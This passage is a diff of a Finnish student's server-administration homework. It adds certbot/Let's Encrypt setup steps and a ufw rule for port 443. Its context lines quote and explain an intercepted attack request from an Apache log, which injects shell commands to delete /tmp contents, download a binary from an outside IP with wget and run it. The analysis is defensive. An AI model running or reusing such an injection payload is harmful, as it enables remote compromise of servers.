@@ -141,14 +141,36 @@ Tietue | Selitys
 "GET /shell?cd+/tmp;rm+-rf+*;wget+ http;//23,94,7,175/,s4y/arm;sh+/tmp/arm" | Hyökkääjä pyytää (GET) resurssia ja antaa parametreiksi koodin pätkän. Tällä koodilla hän yrittää avata shell istunnon, navigoida root sijainnin väliaikaistiedostoihin (cd /tmp), poistaa koko tmp kansion sisällön alikansioineen (rm -rf *), ja ladata verkosta kansioon oman ohjelmansa wget -komennolla. Lopuksi hän pyrkii suorittamaan kyseisen ohjelman sh komennolla.   
 400 | Statuskoodi, jonka palvelin ilmoitti takaisin käyttäjälle.  [400 Bad Request](https://en.wikipedia.org/wiki/HTTP_400) eli esitetyssä pyynnössä oli jotain vikaa.
 477 | Käyttäjälle palautetun tiedoston koko tavuina.  
-\-| Referoija eli miltä sivulta pyyntö tuli.  
+\- | Referoija eli miltä sivulta pyyntö tuli.  
 \- | Järjestelmä ja selaintiedot jotka käyttäjän selain ilmoitti.  
   
 Kyseessä oli selkeä hyökkäysyritys, jossa tunkeutuja yrittää ottaa komentokehoitteen haltuunsa koodi-injektiolla, ladata palvelimen juuren /tmp kansioon  oletettavasti haitallisen sovelluksen ja käynnistää sen. Hyökkääjän käyttämä pyyntö todettiin kuitenkin palvelimen puolella vialliseksi joten hyökkäys ei edennyt. Nopea katsaus ls -la komennolla /tmp kansioon myös paljastaa, että siellä a) on useita tiedostoja ja kansioita ja b) ei ole hyökkääjän lataamaa sijaintia.     
    
 ### c) Vapaaehtoinen: Laita TLS-salakirjoitus (https) toimimaan Let's Encrypt avulla. Vinkki: certbot tai lego.  
   
+Päätin valita sertifikaatin luomiseksi certbotin vaikka, sen asentamiseen tarvitaankin snap paketinhallinta.  
+Aloitin asentamalla snapin palvelimelle https://snapcraft.io/docs/installing-snap-on-debian  
+Asensin snapin ja käynnistin palvelimen uudelleen, jotta PATH arvot päivittyvät varmasti oikein:  
+\$ sudo apt-get install snapd  
+\$ sudo reboot  
   
+Asensin snap coren joka takaa, että snapd:sta on uusin versio asennettuna (mitä tuo sitten tarkoittaakaan):  
+\$ sudo snap install core  
+  
+Certbotin asennus ja softlinkin luominen /usr/bin/ sijaintiin, jotta certbot komento on määritetty polkuun ja varmasti käytettävissä kaikkialla.  
+\$ sudo snap install certbot  
+\$ sudo ln -s /snap/bin/certbot /usr/bin/certbot  
+  
+Sertifikaatin luominen ja parametrina --apache jolloin certbot myös asentaa valmiin sertifikaatin automaattisesti.  
+\$ sudo certbot --apache  
+  
+Testasin ja sivulle ei saada enää yhteyttä. Testattu Linux kannettavalla Firefox selaimella ja Android puhelimen Microsoft Edge selaimella.  
+Mieleen tuli, että https portti on varmaankin blokattu palomuurilla. En muistanut porttia ulkoa, joten duckduckgo haku "https port" ja sain useamman tuloksen jotka ilmoittivat portin olevan 443.  
+Siis:  
+\$ sudo ufw allow 443/tcp  
+  
+Nyt sivut taas toimivat:  
+<img src="mpcomCertOk.png">  
   
 ### e) Vapaaehtoinen: Tee weppisivuja omalla, paikallisella koneellasi ja kopioi ne palvelimelle scp-komennolla.  
   
